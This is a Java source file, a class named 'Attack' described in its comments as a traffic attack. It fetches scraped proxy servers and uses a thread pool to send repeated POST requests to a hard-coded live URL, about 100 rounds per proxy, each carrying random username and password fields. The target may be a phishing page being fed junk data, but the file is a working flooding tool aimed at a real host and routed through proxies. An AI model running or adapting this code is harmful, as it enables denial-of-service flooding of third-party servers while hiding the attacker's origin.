package com.zxx.proxycrawler;

import cn.hutool.http.HttpRequest;
import cn.hutool.json.JSONObject;
import com.zxx.proxycrawler.entity.Proxy;
import com.zxx.proxycrawler.util.DailiUtil;
import com.zxx.proxycrawler.util.RandomUtil;
import lombok.Data;

import java.net.InetSocketAddress;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * 流量攻击
 *
 * @author zxx
 * @version 1.0
 * @date 2019/11/20 15:46
 */
public class Attack {

    /**
     * 请求次数
     */
    private static int num = 100;

    /**
     * 获取代理的线程池
     */
    public static ThreadPoolExecutor proxyPool;

    public static void main(String[] args) {
        proxyPool = new ThreadPoolExecutor(50, 100, 100L, TimeUnit.MILLISECONDS,
                new ArrayBlockingQueue<Runnable>(1000),new ThreadPoolExecutor.DiscardPolicy());
        proxyPool.allowCoreThreadTimeOut(true);
        List<Proxy> proxies = DailiUtil.getProxy();
        if(proxies.size()>0){
            for (int i = 0;i<num;i++){
                for (Proxy proxy:proxies) {
                    proxyPool.execute(new Runnable() {
                        @Override
                        public void run() {
                            getUrl(proxy);
                        }
                    });
                }
            }
        }else{
            System.out.println("没有代理服务器不进行请求");
        }
    }

    public  static void getUrl(Proxy proxy){
        String url = "http://wegame.fyfsvcs.com.cn/2017.php";
        Value value = new Value(RandomUtil.getRandom(11),RandomUtil.getRandom(8),1);
        JSONObject jsonObject = new JSONObject(value);
        java.net.Proxy proxy1  = new java.net.Proxy(java.net.Proxy.Type.HTTP,new InetSocketAddress(proxy.getIp(),Integer.parseInt(proxy.getPort())));
        try {
            HttpRequest.post(url).setProxy(proxy1).form(jsonObject.toBean(HashMap.class)).timeout(20000)
                    .execute().body();
        }catch (Exception e) {
            System.out.println("当前代理请求超时Ip："+proxy.getIp()+"，port："+proxy.getPort());
        }
    }
}
@Data
class Value{
    private String u;
    private String p;
    private Integer bianhao;

    public Value(String u, String p, Integer bianhao) {
        this.u = u;
        this.p = p;
        this.bianhao = bianhao;
    }
}
